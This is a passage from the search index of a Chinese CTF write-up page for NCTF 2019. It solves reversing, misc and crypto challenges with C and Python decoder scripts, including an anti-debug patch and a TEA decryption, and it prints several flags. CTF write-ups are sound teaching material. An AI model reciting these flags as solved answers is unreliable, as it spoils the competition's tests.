d[26] & d[33] & d[40] & d[47] \\ d[6] & d[13] & d[20] & d[27] & d[34] & d[41] & d[48] \\end{matrix} \\right} \\tag{3} $$ (1) * (2) = (3) NCTF{nctf2019_linear_algebra_is_very_interesting}","title":"\u7b7e\u5230\u9898"},{"location":"writeup/NJUPT-2019/#debug","text":"IDA\u6253\u5f00 \u6211\u6ca1\u622a\u56fe2333\uff0c\u4e0d\u8fc7\u53ef\u4ee5\u901a\u8fc7\u52a8\u8c03\u6765\u5f97\u5230\u7b54\u6848\uff0c\u597d\u50cf\u662f\u4e2d\u9014\u751f\u6210flag\u6765\u548c\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u6bd4\u8f83 \u53ea\u9700\u8981\u518d\u6bd4\u8f83\u7684\u5730\u65b9\u4e0b\u65ad\u70b9\uff0c\u67e5\u770b\u6808\u5373\u53ef\u5f97\u5230\u7b54\u6848\u3002","title":"debug"},{"location":"writeup/NJUPT-2019/#easy-ternary","text":"AHK\u811a\u672c\u8bed\u8a00\u5f88\u660e\u767d\u4e86\uff0c\u76f4\u63a5\u5230exe\u91cc\u628a\u811a\u672c\u63d0\u51fa\u6765 XOR(a, b) { tempA := a tempB := b ret := 0 Loop, 8 { ret += Mod((((tempA >> ((A_Index - 1)*4)) & 15) + ((tempB >> ((A_Index - 1)*4)) & 15)),3) * (16**(A_Index-1)) } return ret } InputBox, userInput, TTTTCL, Input your flag: if(ErrorLevel) Exit if(!StrLen(userInput)) #\u6ca1\u6709\u8bfb\u5165 { MsgBox, GG Exit } inputArr := [] #\u4fdd\u5b58\u8f93\u5165\u7684\u6570\u636e Loop, parse, userInput { temp:=A_Index inputArr.Push(Ord(A_LoopField)) #\u8bfb\u5165\u8bfb\u5165\u6846 } inputNum := [] #\u64cd\u4f5c\u540e\u4fdd\u5b58\u7684\u6570\u7ec4 Loop % inputArr.Length() { temp := inputArr[A_Index] temp := DllCall(\"aiQG.dll\\?ToTrit@@YAII@Z\", \"UInt\", temp) inputNum.push(temp) } key1 := XOR(inputNum[5], inputNum[inputNum.Length()]) #key\u5c31\u662f{}\u7684XOR inputFlag := [] Loop % inputArr.Length() { temp := XOR(inputNum[A_Index], key1) if(Mod(A_Index,2)) { temp := XOR(key1,temp) } inputFlag.push(temp) } temp1 := 1 #\u662f\u5426\u6210\u529f Loop % inputFlag.Length() #\u68c0\u9a8c { temp := inputFlag[A_Index] temp := DllCall(\"aiQG.dll\\?Check@@YAIII@Z\", \"UInt\", temp, \"UInt\", A_Index) if(!temp) { temp1 := 0 } } if(temp1) { MsgBox, Ok } if(!temp1) { MsgBox, GG } \u8c03\u7528\u4e86dll,\u9006\u5411dll\uff0c\u53d1\u73b0\u5c31\u4e00\u4e2a\u5bf9\u6bd4\u6570\u5b57\u548c\u8f6c\u4e09\u8fdb\u5236 exp\uff1a #include<cstdio> #include<cmath> #include<windows.h> using namespace std; int xors(int a,int b) { int ret=0; for(int i=1;i<=8;i++) ret=ret+(((a>>(((i-1)*4))&15)+((b>>((i-1)*4))&15))%3)*(pow(16,(i-1))); return ret; } int change(int x) { int t,ans=0,k=0; while(x) { t=x%10; ans=ans+pow(3,k++)*t; x/=10; } return ans; } void genS() { int data[100]={0x00,0x10011,0x21020,0x21101,0x21000,0x22211,0x2220,0x21200,0x2101,0x22120,0x20122,0x22220,0x2021,0x10122,0x20102,0x22111,0x211,0x12012,0x2210,0x22202,0x2021,0x21101,0x2222,0x21101,0x2222,0x21121,0x21120,0x22210}; for(int c=1;c<=27;c++) { for(int i=0;i<=0x22222222;i++) { int t=xors(i,0x22212); if(c%2) t=xors(0x22212,t); if(t==data[c]) { printf(\"%X,\",i); break; } } } } int main() { int s[1000]={2220,2111,10010,2121,11120,10011,10112,10222,11002,1210,11102,10112,2001,1220,11020,11002,1221,10001,11111,10112,10010,10010,10010,10010,10000,2211,11122,0}; for(int i=0;s[i]!=0;i++) printf(\"%c\",change(s[i])); return 0; }","title":"Easy Ternary"},{"location":"writeup/NJUPT-2019/#_2","text":"\u786e\u5b9e\u591f\u4e11\u964b\u7684\uff0c\u5230\u5904\u8df3\u8f6c IDA\u6253\u5f00\u540e\u53d1\u73b0\u6709\u53cd\u8c03\u8bd5\uff0cnop\u6389\uff0c\u53d1\u73b0\u539f\u6765\u65e0\u6cd5\u8fd0\u884c\u7684\u51fd\u6570\u53ef\u4ee5\u8fd0\u884c\u4e86(\u4e4b\u524d\u5f02\u6216\u4e86) \u9274\u4e8e\u65e0\u6cd5F5\uff0c\u5f00\u59cb\u5934\u94c1\u65f6\u95f4\uff0c\u53d1\u73b0\u6700\u540e\u5c31\u662f\u4e2aTEA #include<cstdio> #define _DWORD int using namespace std; unsigned char code[]={0x88,0x71,0x3E,0xFE,0x66,0xF6,0x77,0xD7,0xA0,0x51,0x29,0xF9,0x11,0x79,0x71,0x49,0xF1,0x61,0xA0,0x9,0xF1,0x29,0x1,0xB1}; /* tea_decrypt(0x61869F5E,0x0A9CF08D); tea_decrypt(0xAD74C0CA,0xA57F16B8); tea_decrypt(0xB559626D,0xD17B68E0);*/ int getlowbit(int x) { return x&0xFF; } void tea_decrypt(unsigned long v0,unsigned long v1) { unsigned long sum=0xC6EF3720,i; unsigned long delta=0x9e3779b9; unsigned long k0=0x12345678,k1=0xBADF00D,k2=0x05201314,k3=0x87654321; for(i=0;i<32;i++) { v1-=((v0<<4)+k2)^(v0+sum)^((v0>>5)+k3); v0-=((v1<<4)+k0)^(v1+sum)^((v1>>5)+k1); sum-=delta; } unsigned char* v=((unsigned char*)&v0); printf(\"0x%X 0x%X 0x%X 0x%X\\n\",getlowbit(*((char*)v)),getlowbit(*((char*)v+1)),getlowbit(*((char*)v+2)),getlowbit(*((char*)v+3))); v=((unsigned char*)&v1); printf(\"0x%X 0x%X 0x%X 0x%X\\n\",getlowbit(*((char*)v)),getlowbit(*((char*)v+1)),getlowbit(*((char*)v+2)),getlowbit(*((char*)v+3))); } unsigned char encode(unsigned char c) { int a=c>>5,b=c<<3; return ((a|b)^0x5A); } int main() { for(int i=0;i<24;i++) { int c=code[i]; for(int j=0;j<=0xFF;j++) if(c==encode(j)) { int t=j; if(i==0 || i==4) t-=0xC; if(i==1 || i==5) t-=0x22; if(i==2 || i==6) t-=0x38; if(i==3 || i==7) t-=0x4E; printf(\"%c\",t); } } return 0; }","title":"\u4e11\u964b\u7684\u4ee3\u7801"},{"location":"writeup/NJUPT-2019/#f-bird","text":"\u5f00\u5386\u53f2\u7684\u5012\u8f66\uff0c16\u4f4d\u90fd\u6765\u4e86 \u76f4\u63a5\u770b\u6c47\u7f16\uff0c\u6709\u4e00\u6bb5\u5f02\u6216\uff0c\u4e0d\u8fc7\u7528bx\u5bc4\u5b58\u5668\u9ad8\u4f4e\u4f4d\u4f9d\u6b21\u5f02\u6216 \u7b97\u51fa\u6765\u4e24\u4e2a\u5f02\u6216\u7684\u6570\u662f\u591a\u5c11 \u7136\u540e\u5f02\u6216\u5c31\u884c\u4e86 k=[0x8E,0x9D,0x94,0x98,0xBB,0x89,0xF3,0xEF,0x83,0xEE,0xAD,0x9B,0x9F,0x9A,0xF0,0xEB,0x9F,0x97,0xF6,0xBC,0xF1,0xE9,0x9F,0xE7,0xA1,0xB3,0xF3,0xA3] i=0 flag=\"\" for c in k: if(i&1): flag=flag+chr(c^0xde) else: flag=flag+chr(c^0xc0) i=i+1 print(flag)","title":"F-Bird"},{"location":"writeup/NJUPT-2019/#misc","text":"","title":"Misc"},{"location":"writeup/NJUPT-2019/#nctf2019","text":"\u586b\u8868\uff0c\u586b\u5b8c\u5c31\u51faflag","title":"NCTF2019\u95ee\u5377\u8c03\u67e5"},{"location":"writeup/NJUPT-2019/#pip2-install","text":"\u5148\u5229\u7528\u865a\u62df\u673a\u8fde\u63a5\u4e00\u4e0b\u3002[\u56fe\u7247] \u6211\u5df2\u7ecf\u4e0b\u8fc7\u4e86 \u4e0b\u8f7d\u7684\u8fc7\u7a0b\u4e2d\u6709\u4e00\u4e2a\u94fe\u63a5\u51fa\u6765\u4e86\u3002 win\u4e0b\u6253\u5f00\u5b83\uff01 \u5b58\u5728\u4e00\u4e2asetup.py \u4e2d\u95f4\u6709\u4e00\u4e32\u4e0d\u77e5\u6240\u4e91\u7684\u5b57\u7b26\u4e32\u3002 \u76f4\u63a5base64\u89e3\u5bc6\u5c31\u53ef\u4ee5\u4e86","title":"PiP2 install"},{"location":"writeup/NJUPT-2019/#a_good_idea","text":"\u4e00\u5f20\u56fe\u7247\u3002\u60f3\u90fd\u4e0d\u8981\u60f3\u76f4\u63a5binwalk [\u56fe\u7247] \u6709\u4e24\u5f20\u56fe\u7247\uff0chint\u662f\u5bfb\u627e\u50cf\u7d20\u7684\u79d8\u5bc6\u3002 \u90a3\u5c31stegsolve\u4e00\u4e0bcombine\u4e24\u5f20\u56fe\u7247\u7136\u540e\u5de6\u53f3\u5207\u6362\u901a\u9053\u4e00\u6b21\u5c31\u5f97\u5230\u4e8c\u7ef4\u7801\u4e86 \u626b\u63cf\u5373\u53ef","title":"a_good_idea"},{"location":"writeup/NJUPT-2019/#whats-this","text":"\u6d41\u91cf\u5206\u6790\u76f4\u63a5\u770bhttp\u534f\u8bae\u3002\u5168\u90e8\u5bfc\u51fa\u540e\u5f97\u5230\u6709\u4e00\u4e2azip\u6587\u4ef6\u5305\u91cc\u9762\u5305\u542b\u4e86\u4e00\u4e2awhat 1s th1s .txt\u91cc\u9762\u683c\u5f0f\u4e0ebase64\u9690\u5199\u5f88\u50cf\u76f4\u63a5py\u8fd0\u884c [\u56fe\u7247]","title":"what`s this"},{"location":"writeup/NJUPT-2019/#become-a-rockstar","text":"\u4e0b\u8f7d\u5f97\u5230\u4e00\u4e2arock\u6587\u4ef6 \u4e00\u756a~~\u767e\u5ea6~~Bing\u540e\u4e86\u89e3\u5230Rockstar\u8fd9\u4e2a\u7f16\u7a0b\u8bed\u8a00 https://github.com/RockstarLang/rockstar https://github.com/yyyyyyyyyyan/rockstar-py \u4f7f\u7528rockstar-py rockstar-py Become_a_Rockstar.rock \u5f97\u5230\u4e00\u6bb5python\u4ee3\u7801 Leonard_Adleman = \"star\" Problem_Makers = 76 Problem_Makers = \"NCTF{\" def God(World): a_boy = \"flag\" the_boy = 3 def Evil(your_mind): a_girl = \"no flag\" the_girl = 5 Truths = 3694 Bob = \"ar\" Adi_Shamir = \"rock\" def Love(Alice, Bob): Mallory = 13 Mallory = 24 Everything = 114514 Alice = \"you\" def Reality(God, Evil): God = 26 Evil = 235 Ron_Rivest = \"nice\" def You_Want_To(Alice, Love, Anything): You = 5.75428 your_heart = input() You = 5 your_mind = input() Nothing = 31 if Truths * Nothing == Everything: RSA = Ron_Rivest + Adi_Shamir + Leonard_Adleman if Everything / Nothing == Truths: Problem_Makers = Problem_Makers + Alice + Bob print(Problem_Makers) the_flag = 245 the_confusion = 244 print(RSA) Mysterious_One = \"}\" print(Mysterious_One) This = 4 This = 35 This = 7 This = 3 This = 3 This = 37 \u8dd1\u4e00\u4e0bflag\u5c31\u51fa\u6765\u4e86 NCTF{youarnicerockstar}","title":"Become a Rockstar"},{"location":"writeup/NJUPT-2019/#_3","text":"\u53c8\u4e00\u4e2a\u6d41\u91cf\u5206\u6790\u76f4\u63a5\u5bfchttp\u53d1\u73b0\u5305\u91cc\u5b58\u5728\u4e00\u4e2a1.html\u6253\u5f00\u90fd\u662f \u76f4\u63a5\u8f6ctxt\u731c\u6d4b\u662f\u56fe\u7247RGB \u5229\u7528python\u811a\u672c\u8f6c\u6210\u56fe\u7247\u53ef\u6700\u7ec8\u5f97\u5230flag.","title":"\u5c0f\u72d7\u7684\u79d8\u5bc6"},{"location":"writeup/NJUPT-2019/#2077","text":"\u76f4\u63a5 Google Cyberpunk 2077 stream decode. \u7136\u540e\u5728\u4e00\u4e2a reddit \u5e16\u5b50 \u4e2d\uff0c\u627e\u5230\u56fe\u7247\u4e0b\u8f7d\u5730\u5740\u3002\u4e0b\u8f7d\u540e\u7528 sha256sum \u6c42 sha256 \u503c\u5373\u53ef\u3002","title":"2077"},{"location":"writeup/NJUPT-2019/#crypto","text":"","title":"Crypto"},{"location":"writeup/NJUPT-2019/#keyboard","text":"\u770b\u5230\u8fd9\u91cc\u603b\u5171\u67098\u4e2a\u5b57\u6bcd\uff0c\u6700\u591a\u91cd\u590d\u4e864\u6b21\uff0c\u89c9\u5f97\u5c31\u5bf9\u5e94\u4e86\u624b\u673a\u952e\u76d8\u4e2d\u7684\u4e5d\u5bab\u8f93\u5165\u6cd5\uff0c\u53bb\u624b\u8bd5\u4e86\u8bd5\uff0c\u524d\u9762\u5c31\u51fa\u6765\u4e86youare\uff0c\u4e8e\u662f\u5199\u4e86\u4e2a\u7a0b\u5e8f\u7801\u4e86\u51fa\u6765 #include <cstdio> #include <cstring> char a[100][5]={\"ooo\",\"yyy\",\"ii\",\"w\",\"uuu\",\"ee\",\"uuuu\",\"yyy\",\"uuuu\",\"y\",\"w\",\"uuu\",\"i\",\"i\",\"rr\",\"w\",\"i\",\"i\",\"rr\",\"rrr\",\"uuuu\",\"rrr\",\"uuuu\",\"t\",\"ii\",\"uuuu\",\"i\",\"w\",\"u\",\"rrr\",\"ee\",\"www\",\"ee\",\"yyy\",\"eee\",\"www\",\"w\",\"tt\",\"ee\"}; char b[100][5]={\"w\",\"ww\",\"www\",\"e\",\"ee\",\"eee\",\"r\",\"rr\",\"rrr\",\"t\",\"tt\",\"ttt\",\"y\",\"yy\",\"yyy\",\"u\",\"uu\",\"uuu\",\"uuuu\",\"i\",\"ii\",\"iii\",\"o\",\"oo\",\"ooo\",\"oooo\"}; char c[27]=\"abcdefghijklmnopqrstuvwxyz\"; int main() { for(int i=0;i<=38;++i) { for(int j=0;j<=25;++j) { if(strcmp(a[i],b[j])==0) { printf(\"%c\",c[j]); break; } } } return 0; } youaresosmartthatthisisjustapieceofcake","title":"keyboard"}]}